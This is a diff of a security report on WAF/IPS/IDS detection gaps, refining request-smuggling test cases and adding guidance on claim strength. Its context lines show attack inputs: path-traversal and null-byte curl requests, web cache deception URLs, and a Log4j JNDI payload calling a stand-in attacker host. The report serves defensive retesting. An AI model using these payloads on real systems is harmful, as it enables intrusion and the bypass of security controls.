@@ -45,6 +45,8 @@ image: "/images/pdf-previews/Structural_Parsing_Gaps_p1.webp"
 
 - **GitHub:** [`windshock/waf-ips-ids-retest`](https://github.com/windshock/waf-ips-ids-retest)
 - This repository automates the retest scenarios referenced in this report, including TC-based replay, visibility checks, response origin classification, and evidence generation.
+- **GitHub:** [`windshock/security-hypothesis-lab`](https://github.com/windshock/security-hypothesis-lab)
+- This repository provides the higher-level experiment workflow for separating `fact / premise / hypothesis / conclusion`, deciding when to improve the lab, and controlling claim strength.
 
 ## **WAF/IPS/IDS Detection Gap Analysis and Remediation Direction**
 
@@ -260,7 +262,7 @@ The following open-source tools can perform automated testing corresponding to e
 | **Smuggler** | [defparam/smuggler](https://github.com/defparam/smuggler) | Protocol boundary | Auto-tests 60~300+ variations of Transfer-Encoding headers (whitespace, control characters, case variations, line breaks, duplicate headers, etc.). Timeout-based CL.TE/TE.CL detection. Automatically saves discovered payloads to `payloads/` directory |
 | **Cortisol** | [toxy4ny/cortisol](https://github.com/toxy4ny/cortisol) | Encoding/normalization discrepancy, path normalization | Double/Triple URL Encoding, UTF-8 Overlong Sequence(`%C0%BC`, `%E0%80%BC`, `%F0%80%80%BC`), space2comment, apostrephemask etc. tamper chain application. Auto-detects Cloudflare/AWS/Sucuri/Imperva/ModSecurity/Akamai/F5/Wordfence |
 | **WAF-Bypass** | [nemesida-waf/waf-bypass](https://github.com/nemesida-waf/waf-bypass) | Comprehensive (full assessment) | SQLi, XSS, RCE, LFI, SSRF, SSTI, Log4j etc. 18 categories across 7 zones (URL, ARGS, BODY, COOKIE, USER-AGENT, REFERER, HEADER). Supports Base64/HTML-Entity/UTF-16 encoding variations. `--curl-replay`for reproduction command output |
-| **WCD Testing Tool** | [Ap6pack/web-cache-deception-testing-tool](https://github.com/Ap6pack/web-cache-deception-testing-tool) | Middle-layer to backend normalization | 6 static extensions(.css, .webp, .webp, .txt, .html, .ico) and 8 delimiters(`;@,!~%#?`)to automatically verify cache hits. Detects cross-user exposure by comparing authenticated/unauthenticated requests |
+| **WCD Testing Tool** | [Ap6pack/web-cache-deception-testing-tool](https://github.com/Ap6pack/web-cache-deception-testing-tool) | Middle-layer to backend normalization | 6 static extensions(.css, .jpg, .png, .txt, .html, .ico) and 8 delimiters(`;@,!~%#?`)to automatically verify cache hits. Detects cross-user exposure by comparing authenticated/unauthenticated requests |
 | **HTTP Request Smuggler** (Burp) | [PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler) | Protocol boundary (HTTP/2 included) | Burp Suite extension. Supports HTTP/2 downgrade (H2.CL, H2.TE, H2.0), pause-based desync, and client-side desync in addition to HTTP/1.1 CL.TE/TE.CL. Auto-detects parser discrepancy (v3.0, 2025) |
 
 ### **Tool Installation and Basic Usage**
@@ -521,7 +523,7 @@ curl https://target.example.com/public/../admin/dashboard
 curl https://target.example.com/public/..%2Fadmin%2Fdashboard
 
 # Null byte insertion (for legacy servers)
-curl https://target.example.com/admin%00.webp
+curl https://target.example.com/admin%00.jpg
 ```
 
 **Judgment Criteria**: If normal path is blocked but variant path passes and backend routes to the same resource → Path normalization gap confirmed
@@ -1034,7 +1036,7 @@ curl https://target.example.com/my-account/profile.css
 **Automation Tool (WCD Testing Tool)**:
 
 ```bash
-# 6 extensions(.css, .webp, .webp, .txt, .html, .ico) × 8 delimiters(; @ , ! ~ % # ?) auto-test
+# 6 extensions(.css, .jpg, .png, .txt, .html, .ico) × 8 delimiters(; @ , ! ~ % # ?) auto-test
 python3 cache_deception_test.py \
   --url "https://target.example.com/my-account" \
   --cookie "session=VALID_SESSION"
@@ -1051,7 +1053,7 @@ python3 cache_deception_test.py \
 ```
 # Extension test
 https://target.example.com/my-account.css
-https://target.example.com/my-account.webp
+https://target.example.com/my-account.jpg
 https://target.example.com/my-account.ico
 
 # Delimiter test
@@ -1325,7 +1327,7 @@ Cookie: session=AAA...AAA; pad=BBBB...BBBB; exploit=${jndi:ldap://attacker/a}
 ### **TC-24. Chunk Extension / Trailer Header Parsing**
 
 **Target Gap**: Protocol boundary gap / parser discrepancy  
-**Purpose**: Verify whether chunk extensions and trailer headers are missed in the inspection path
+**Purpose**: Verify whether chunk extensions, trailer headers, and quoted-string CRLF or escaped LF/CR variants lead to request-boundary anomalies
 
 **Test Requests**:
 
@@ -1338,9 +1340,23 @@ test
 X-Ignore: a
 ```
 
+**Extended Inspection Points**:
+- Treat `quoted_string_crlf` and escaped LF/CR variants as separate outcomes from simple chunk extension or trailer omission.
+- Record at least four distinct outcomes: `(1) single-request anomaly`, `(2) hidden second request execution`, `(3) response-queue poisoning`, `(4) fan-out / availability pressure`.
+- Even if hidden second request execution is observed, do not immediately escalate to cross-user desync or session confusion unless victim-side response ownership is proven.
+- same-IP or same-host harnesses can understate concurrency or fan-out ceilings and can introduce lab artifacts, so fan-out or DoS-style claims should be rerun with distinct client IPs or isolated namespaces.
+- Use only fresh-lab or post-cooldown reruns when writing a stable ceiling or DoS number.
+
+**Recommended Automation**:
+- `run_tc24_smuggling_probe.py`: checks `quoted_string_crlf`, escaped LF/CR variants, and multi-response markers such as `status_chain`
+- `run_tc24_multiip_probe.sh`: reruns multi-client fan-out in a local Docker lab
+
 **Judgment Criteria**:
 - If WAF ignores chunk extension/trailer and only backend processes them → parser discrepancy
 - If trailer acts as security-relevant metadata → backend interpretation mismatch
+- If multiple response markers appear for a single request or a hidden follow-up request executes → record as a request-boundary anomaly
+- Conclude response-queue poisoning only when an attacker-owned response is actually observed on the victim connection
+- Record fan-out pressure as a stable impact only after multi-client rerun and fresh-lab/cooldown validation
 
 ### **TC-25. HTTP/3 Visibility Parity**
 
@@ -1364,13 +1380,29 @@ X-Ignore: a
 - If only handshake is inspected and frame payload is blind spot → post-handshake blind spot
 - If query/header-based judgment differs from actual frame processing results → upgrade path parity insufficient
 
+### **Hypothesis-Driven Validation and Claim Strength**
+
+The newer retest workflow uses `$waf-ips-ids-retest` as the execution layer and `$security-hypothesis-lab` as the interpretation layer. The key is not to "run more probes" but to separate **what is confirmed** from **what is still a hypothesis**.
+
+- `fact`: directly observed captures, logs, response fingerprints, pcaps, or debug traces
+- `premise`: unverified assumptions such as proxy chain, backend type, cache placement, or same-IP bias
+- `hypothesis`: one causal claim to test next
+- `conclusion`: only what remains after the premise is checked or the lab is improved
+
+Operationally, the following rules matter.
+
+- If the stronger impact depends on extra assumptions, write the **demonstrated primitive and the conditional impact separately**.
+- If the current lab cannot answer the real question, do not stretch the conclusion; **improve the lab or downgrade the claim**.
+- If same-IP, same-host, or warm-lab state may be biasing the result, correct that bias before treating reruns as stronger evidence.
+- It is safer to express claim strength in tiers such as `target-proven`, `lab-proven`, and `hypothesis-only`.
+
 ---
 
 ## **7. Conclusions**
 
 Analysis results indicate that detection failures of security appliances stem not from simple rule deficiency but from the structural root cause of **interpretation discrepancies between WAF–proxy–cache–application frameworks**. As confirmed by 2025 latest research (WAFFLED 1,207 unique bypasses, PortSwigger HTTP/2 desync, CVE-2025-32094 Expect desync), the areas where signature-based detection alone cannot provide defense are expanding.
 
-Future detection systems must be enhanced in the following **eleven directions**, sorted by operational priority.
+Future detection systems must be enhanced in the following **thirteen directions**, sorted by operational priority.
 
 1. **Protocol Boundary Control (Highest Priority)**: HRS/desync directly leads to authentication/ACL bypass. HTTP/2 end-to-end application, regular desync scanner (HTTP Request Smuggler) operation, and strict blocking of 0.CL/Expect header variations are essential.
 
@@ -1393,6 +1425,10 @@ Future detection systems must be enhanced in the following **eleven directions**
 10. **Positive Security Adoption**: For APIs where parser discrepancies repeatedly occur, applying Positive Security measures such as OpenAPI/Swagger-based schema validation, unknown field blocking, type mismatch blocking, and additionalProperties restrictions is more effective than adding rules.
 
 11. **Conservative OOB / Extended Protocol Judgment**: Callback non-receipt must be interpreted alongside DNS sinkhole, proxy, and egress filtering. For protocols like HTTP/3, WebSocket, GraphQL, and gRPC, protocol-aware inspection must be separately verified when usage is indicated.
+
+12. **Establish a Hypothesis-Driven Validation Loop**: Without separating fact, premise, hypothesis, and conclusion, parser discrepancy and smuggling results are easily overstated. For noisy runs, decide first whether the next step is lab improvement, stronger ownership evidence, or claim downgrade rather than blind repetition.
+
+13. **Separate Claim Strength from Smuggling Impact**: Request-boundary anomaly, hidden second request execution, response-queue poisoning, cross-user confusion, and fan-out pressure are not the same outcome. Promote only the results that still hold after removing same-IP bias and warm-lab artifacts to `target-proven`; leave the rest as `lab-proven` or `hypothesis-only`.
 
 ---
 
